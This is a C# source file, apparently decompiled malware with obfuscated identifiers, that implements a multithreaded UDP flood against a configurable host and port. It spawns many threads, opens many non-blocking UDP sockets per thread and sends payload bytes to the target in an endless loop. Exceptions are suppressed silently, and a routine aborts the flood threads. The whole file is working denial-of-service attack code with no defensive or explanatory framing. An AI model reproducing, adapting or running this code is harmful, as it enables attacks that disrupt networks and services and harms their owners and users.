using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class DIflsXkjzEGxXmePwyTvBPL
{
	private class uSzdsZfyHwcXXWbMFMqRDTW
	{
		private Socket[] pvDTutKzDtTvbZHvQGwLVEE;

		private IPEndPoint qqSanPjOmEQFCvOLhRciepH;

		private int IdfoMsWmTZsBpVRRPUGyGkL;

		private byte[] wMQTLjNrbXMgWNblUUHtVqE;

		public uSzdsZfyHwcXXWbMFMqRDTW(IPEndPoint SzRDHgVSMebyUsyuHKYtvFP, int JmDVpJDsYhhgkWPWBNNdgjb)
		{
			qqSanPjOmEQFCvOLhRciepH = SzRDHgVSMebyUsyuHKYtvFP;
			IdfoMsWmTZsBpVRRPUGyGkL = JmDVpJDsYhhgkWPWBNNdgjb;
		}

		private static void zPIrZcwZdrCXkXKlIGiQhTX(IAsyncResult ar)
		{
		}

		public void Send()
		{
			checked
			{
				try
				{
					pvDTutKzDtTvbZHvQGwLVEE = new Socket[IdfoMsWmTZsBpVRRPUGyGkL - 1 + 1];
					int num = IdfoMsWmTZsBpVRRPUGyGkL - 1;
					int i;
					for (i = 0; i <= num; i++)
					{
						pvDTutKzDtTvbZHvQGwLVEE[i] = new Socket(qqSanPjOmEQFCvOLhRciepH.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
						pvDTutKzDtTvbZHvQGwLVEE[i].Blocking = false;
						pvDTutKzDtTvbZHvQGwLVEE[i].BeginConnect(qqSanPjOmEQFCvOLhRciepH, zPIrZcwZdrCXkXKlIGiQhTX, pvDTutKzDtTvbZHvQGwLVEE[i]);
					}
					Thread.Sleep(10);
					int num2 = IdfoMsWmTZsBpVRRPUGyGkL - 1;
					i = 0;
					while (true)
					{
						if (i <= num2)
						{
							if (pvDTutKzDtTvbZHvQGwLVEE[i].Connected)
							{
								break;
							}
							i++;
							continue;
						}
						return;
					}
					if (uEFDIflsXkjzEGxXmePwyTv == 2)
					{
						wMQTLjNrbXMgWNblUUHtVqE = Encoding.UTF8.GetBytes("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
					}
					else if (uEFDIflsXkjzEGxXmePwyTv == 3)
					{
						wMQTLjNrbXMgWNblUUHtVqE = Encoding.UTF8.GetBytes("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
					}
					else
					{
						wMQTLjNrbXMgWNblUUHtVqE = Encoding.UTF8.GetBytes("~");
					}
					while (true)
					{
						Thread.Sleep(0);
						pvDTutKzDtTvbZHvQGwLVEE[i].Send(wMQTLjNrbXMgWNblUUHtVqE, SocketFlags.Partial);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static ThreadStart[] tHghIRdFZEcuUuGzSBYISYU;

	private static Thread[] gwMTVeCwacJPiqfLHHGLvDK;

	private static IPEndPoint aBzQGJBZDhfNCWNDRbKKxxY;

	private static uSzdsZfyHwcXXWbMFMqRDTW[] htWpVsLXLICURoYiokwNOjl;

	public static string JNnbZTliFayFBNQfBCLVQtJ;

	public static bool ZRpTxhdSmdUhrbaOzbxKYGX;

	public static int bvPJyenomrcVcHUTjmphHVO;

	public static int ygiDfkxJdqeQrONoWnZdEep;

	public static int jCyVrQIEPgvRFOlgKMsMSaP;

	public static short uEFDIflsXkjzEGxXmePwyTv;

	public static void uIFnBaaCKXySxWnOnysLuRB()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(JNnbZTliFayFBNQfBCLVQtJ).AddressList;
			aBzQGJBZDhfNCWNDRbKKxxY = new IPEndPoint(addressList[0], bvPJyenomrcVcHUTjmphHVO);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			IPAddress address = IPAddress.Parse(JNnbZTliFayFBNQfBCLVQtJ);
			aBzQGJBZDhfNCWNDRbKKxxY = new IPEndPoint(address, bvPJyenomrcVcHUTjmphHVO);
			ProjectData.ClearProjectError();
		}
		checked
		{
			gwMTVeCwacJPiqfLHHGLvDK = new Thread[jCyVrQIEPgvRFOlgKMsMSaP - 1 + 1];
			tHghIRdFZEcuUuGzSBYISYU = new ThreadStart[jCyVrQIEPgvRFOlgKMsMSaP - 1 + 1];
			htWpVsLXLICURoYiokwNOjl = new uSzdsZfyHwcXXWbMFMqRDTW[jCyVrQIEPgvRFOlgKMsMSaP - 1 + 1];
			int num = jCyVrQIEPgvRFOlgKMsMSaP - 1;
			for (int i = 0; i <= num; i++)
			{
				htWpVsLXLICURoYiokwNOjl[i] = new uSzdsZfyHwcXXWbMFMqRDTW(aBzQGJBZDhfNCWNDRbKKxxY, ygiDfkxJdqeQrONoWnZdEep);
				tHghIRdFZEcuUuGzSBYISYU[i] = htWpVsLXLICURoYiokwNOjl[i].Send;
				gwMTVeCwacJPiqfLHHGLvDK[i] = new Thread(tHghIRdFZEcuUuGzSBYISYU[i]);
				gwMTVeCwacJPiqfLHHGLvDK[i].Start();
			}
			ZRpTxhdSmdUhrbaOzbxKYGX = true;
		}
	}

	public static void MSOZqFNOYvqUVCJbjZFzByE()
	{
		checked
		{
			int num = jCyVrQIEPgvRFOlgKMsMSaP - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					gwMTVeCwacJPiqfLHHGLvDK[i].Abort();
					gwMTVeCwacJPiqfLHHGLvDK[i] = null;
					tHghIRdFZEcuUuGzSBYISYU[i] = null;
					htWpVsLXLICURoYiokwNOjl[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			ZRpTxhdSmdUhrbaOzbxKYGX = false;
		}
	}
}
